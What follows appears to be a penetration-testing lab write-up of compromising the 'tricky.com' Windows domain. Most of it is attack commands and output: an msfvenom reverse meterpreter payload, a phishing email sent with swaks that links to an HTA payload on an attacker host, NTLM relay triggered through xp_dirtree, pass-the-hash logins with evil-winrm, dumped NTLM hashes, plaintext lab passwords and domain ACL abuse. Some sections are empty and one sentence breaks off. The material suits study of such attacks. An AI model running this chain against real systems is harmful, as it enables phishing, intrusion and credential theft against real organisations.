# Challenge 4

## Enumeration

Only 1 host is remotely available a quick port scan shows that it has multiple ports open.&#x20;

Navigating to the web page on port 80 we see the following information

<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

We also see that port 25 is open so the likely path forward is to send a phishing email

Firstly we create a reverse shell using metasploit

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.204 LPORT=443 -f csharp
```
{% endcode %}



Using DotNetToJscript to

`swaks --body 'Please click here http://192.168.49.64/cmd.hta' --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --header "Subject: Definitely not malware" -t will@tricky.com -f will@tricky.com --server 192.168.64.159`

## Initial Access





## Domain Enumeration



## Domain Escalation

After running bloodhound and running analysis the path to Domain Administrator appears to be pretty straight forward.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

### SQL07

Exploitation

{% code overflow="wrap" %}
```bash
# We can remotely login to SQL05 
proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py will:fdsfssdfDFG4@172.16.100.151 -port 1433 -windows-auth
# Start ntlmrelayx to relay to hash to SQL07
proxychains python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.100.152
# Run SQL query to so NTLMRelayx can forward the hash
EXECUTE ('master.sys.xp_dirtree "\\192.168.49.100\test"')
# Login remotely using hash
proxychains evil-winrm -i 172.16.100.152 -u administrator -H f097f4c64a2af8f0057015a40367ecd9
```
{% endcode %}

Hashes

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f097f4c64a2af8f0057015a40367ecd9:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cf24abb0dd2ff42591001e892d98d690:::
setup:1001:aad3b435b51404eeaad3b435b51404ee:c406ffc61eb698198ad5e88d2f3a344a:::
```

### SQL05

Exploitation

{% code overflow="wrap" %}
```bash
# We can remotely login to SQL07
proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py will:fdsfssdfDFG4@172.16.100.152 -port 1433 -windows-auth
# Start ntlmrelayx to relay to hash to SQL05
proxychains python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.100.151
# Run SQL query to so NTLMRelayx can forward the hash
EXECUTE ('master.sys.xp_dirtree "\\192.168.49.100\test"')
# Login remotely using hash
proxychains evil-winrm -i 172.16.100.152 -u administrator -H f097f4c64a2af8f0057015a40367ecd9
```
{% endcode %}

Hashes

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f11d19a668e5b6532fe2b6324aef5641:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:807e88817b41a28e6a46892728b03ce7:::
setup:1001:aad3b435b51404eeaad3b435b51404ee:85c14abd05f0e6107af13f55fddffdc3:::
```

```powershell
$creds = New-Object System.Management.Automation.PSCredential ("tricky.com\sqlsvc", (ConvertTo-SecureString "4dfgdfFFF542" -AsPlainText -Force))
Add-DomainObjectAcl -TargetIdentity Mailadmins -PrincipalIdentity sqlsvc -Rights All -Credential $creds -Verbose
Add-DomainGroupMember -Identity 'MAILADMINS' -Members 'sqlsvc' -Credential $creds

proxychains bloodhound-python -d tricky.com -u will -p fdsfssdfDFG4 -gc dc04.tricky.com -c all -ns 172.16.100.150

evil-winrm -i 192.168.100.159 -u sqlsvc -p 4dfgdfFFF542
cd ..\..\administrator\desktop
type proof.txt

```
